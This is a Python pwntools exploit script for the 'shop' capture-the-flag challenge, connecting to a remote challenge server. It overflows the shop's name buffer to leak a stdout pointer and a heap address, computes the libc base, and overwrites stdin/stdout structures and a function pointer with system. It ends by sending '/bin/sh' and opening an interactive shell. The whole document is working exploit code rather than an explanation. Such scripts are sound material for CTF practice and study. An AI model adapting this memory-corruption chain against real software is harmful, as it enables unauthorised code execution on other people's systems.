from pwn import *
import os

context.terminal = ['tmux','new-window']
context.aslr = True
libc = ELF('../libc.so.6')



# Run process
context.arch = 'amd64'
#r = process(['./shop'])
r = remote('shop.chal.pwning.xxx',9916)
#r = remote('localhost',5555)
#r = gdb.debug(['./shop'],"b *0x00400e9c\nb *0x400b78\n")

#b *0x00400d50 
def de_bruijn(k, n):
    """
    de Bruijn sequence for alphabet k
    and subsequences of length n.
    """
    try:
        # let's see if k can be cast to an integer;
        # if so, make our alphabet a list
        _ = int(k)
        alphabet = list(map(str, range(k)))

    except (ValueError, TypeError):
        alphabet = k
        k = len(k)

    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return "".join(alphabet[i] for i in sequence)




def add_item(name,desc,price):
    r.sendline('a')
    r.sendline(name)
    r.sendline(desc)
    r.sendline(str(price))


def checkout(buf):
    r.sendline('c')
    r.sendline(buf)

def change_name(name):
    r.sendline('n')
    r.sendline(name)


# initial name
r.sendline('X'*0x129)


# add 0x21 entries
for n in range(0x21):
    add_item(str(n),"blabla",1)


FORBIDDEN_SEQ="aaaa"
ALLOWED_SEQ="bbbb"
checkout_string = de_bruijn("0123456789abcdef", 4)
log.info("Checkout string len: %x" % len(checkout_string))
checkout_string = "\x90\x11\xac\xaa" + "\x28\x1e\x60" + "\x00"*5 + checkout_string.replace(FORBIDDEN_SEQ,FORBIDDEN_SEQ[:-1]) 

checkout_string = checkout_string[:-11]
log.info("Checkout string len: %x" % len(checkout_string))

# get all entries in the checkout list
checkout(checkout_string)

def leak_bytes_name(addr_entry,n=1):
    change_name(p64(addr_entry)+ALLOWED_SEQ+"Y"*0x100+"END") 
    import time
    time.sleep(1)
    r.clean()
    r.sendline("l")
    for _ in range(33):
        print r.recvuntil(": $")
    time.sleep(1)
    tmp = r.recvuntil(": $")[:-3]
    log.info(tmp)
    leak = tmp[-n:]

    return leak

def tohex(s):
    return ''.join(hex(ord(c))[2:] for c in s)

# Leak addr _IO_2_1_stdout_
LEAK_ADDR=0x6020b4 # 3 dwords before stdout
#print tohex(leak_bytes_name(LEAK_ADDR,6))
stdout_leak = u64(leak_bytes_name(LEAK_ADDR,6)+"\x00"*2)
log.info("Leak _IO_2_1_stdout_: %x" % stdout_leak)


libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
IO_list_all =  libc_base + libc.symbols['_IO_list_all']

log.info("Libc base: %x" % libc_base)
log.info("IO_list_all: %x" % IO_list_all)


# Leak an heap addr
LEAK_ADDR= IO_list_all - 0xc # 3 dwords before IO_list_all
#pid = util.proc.pidof(r)[0]
#os.system("cat /proc/%d/maps | grep heap" %pid)
leak = leak_bytes_name(LEAK_ADDR,4).replace('\x0a','')
heap_leak = u64(leak+"\x00"*(8-len(leak)))
log.info("Leak heap: %x",heap_leak)

# Pinpoint some heap that we control
base_heap = heap_leak - 0x10
mystring = base_heap + 0x139c # This corresponds to the name of the first entry

log.info("Addr controlled string: %x" % mystring)


new_addr_name = 0x6020b4 # NULL + \x00\x00\x00\x00 + stdin...
payload = p64(new_addr_name) + FORBIDDEN_SEQ + "ZZZZZZZZZ"
change_name(p64(mystring)+FORBIDDEN_SEQ+payload) # This will not be checked out



#######

r.clean()
checkout(checkout_string)
r.recvuntil('>',0.2)


#gdb.attach(r,"b *0x00400da9")
system = libc_base + libc.symbols['system']
log.info("System: %x" % system)

io_stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
io_stdin = libc_base + libc.symbols['_IO_2_1_stdin_']

change_name("\x00"*12 + p64(io_stdout) + "\x00"*8 + p64(io_stdin) + "\x00"*8 + "A"*(0x130-48) + "\x20\x20\x60")
change_name("/bin/sh\x00"+p64(system))
r.interactive()




